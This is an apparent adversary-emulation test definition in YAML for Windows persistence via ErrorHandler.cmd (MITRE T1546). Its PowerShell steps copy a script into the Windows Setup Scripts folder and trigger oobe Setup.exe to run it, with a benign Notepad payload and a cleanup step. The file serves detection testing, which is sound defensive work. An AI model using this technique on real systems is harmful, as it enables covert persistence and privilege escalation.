api_version: "2.0"
name: Persistence via ErrorHandler.cmd script execution
description: |
    Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.
    Upon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.
uuid: 547a4736-dd1c-4b48-b4fe-e916190bb2e7
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
requirements:
    platforms:
        - os: windows
steps:
    - name: persistence-via-errorhandler.cmd-script-execution
      inline: |
        Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
        C:\windows\System32\oobe\Setup
      executor: powershell
      cleanup:
        inline: 'Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd      '
        executor: powershell
